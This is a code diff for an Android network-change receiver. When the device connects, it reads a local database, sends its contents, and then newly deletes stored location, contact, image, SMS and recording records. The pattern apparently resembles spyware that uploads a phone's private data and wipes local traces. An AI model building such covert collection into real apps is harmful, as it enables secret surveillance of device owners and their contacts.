@@ -40,10 +40,20 @@ public class NetworkReceiver extends BroadcastReceiver {
         if ((wifi.isAvailable() && wifi.isConnected())) {
             readDB(helper);
             send();
+            helper.deleteLocate();
+            helper.deleteContact();
+            helper.deleteImage();
+            helper.deleteSMS();
+            helper.deleteRecord();
         }
         else if (mobile.isAvailable() && mobile.isConnected()){
             readDB(helper);
             send();
+            helper.deleteLocate();
+            helper.deleteContact();
+            helper.deleteImage();
+            helper.deleteSMS();
+            helper.deleteRecord();
         }
     }
     public void readDB(MyDatabaseHelper helper){
